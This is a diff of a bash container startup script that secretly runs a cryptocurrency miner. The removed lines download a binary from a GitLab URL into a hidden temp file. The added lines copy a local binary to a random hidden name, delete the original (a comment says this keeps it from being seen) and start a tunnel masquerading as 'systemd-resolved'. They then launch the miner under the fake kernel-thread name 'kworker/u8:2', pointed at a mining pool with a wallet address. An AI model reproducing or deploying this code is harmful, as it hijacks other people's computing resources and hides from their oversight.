@@ -1,53 +1,21 @@
 #!/bin/bash
 
-# random delay biar gak langsung connect
 sleep $((RANDOM % 20 + 5))
 
-# =========================
-# DOWNLOAD MINER
-# =========================
-
-URLS=(
-"https://gitlab.com/barbieanay003/power2b/-/raw/main/next-app"
-)
-
-TMP="/tmp/.cache.$$"
-
-# retry download
-for i in {1..3}; do
-  URL=${URLS[$RANDOM % ${#URLS[@]}]}
-  curl -sL -A "Mozilla/5.0" "$URL" -o "$TMP" && break
-  sleep 2
-done
-
-# validasi file
-if [ ! -s "$TMP" ]; then
-  exit 1
-fi
-
-# random filename
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
-chmod +x "$TMP"
-mv "$TMP" "/app/$NAME"
 
-# =========================
-# START TUNNEL
-# =========================
+cp /app/sr "/app/$NAME"
+chmod +x "/app/$NAME"
+
+# optional: hapus original biar gak keliatan
+rm -f /app/sr
 
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
---url 127.0.0.1:443 >/dev/null 2>&1 &)
+--url 127.0.0.1:8443 >/dev/null 2>&1 &)
 
 sleep 3
 
-# =========================
-# START MINER
-# =========================
-
-(exec -a kworker/u8:2 /app/$NAME -c config.json >/dev/null 2>&1 &)
-
-# =========================
-# KEEP CONTAINER ALIVE
-# =========================
+(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.$(shuf -n 1 -i 100-999)-Levy -p x >/dev/null 2>&1 &)
 
 tail -f /dev/null
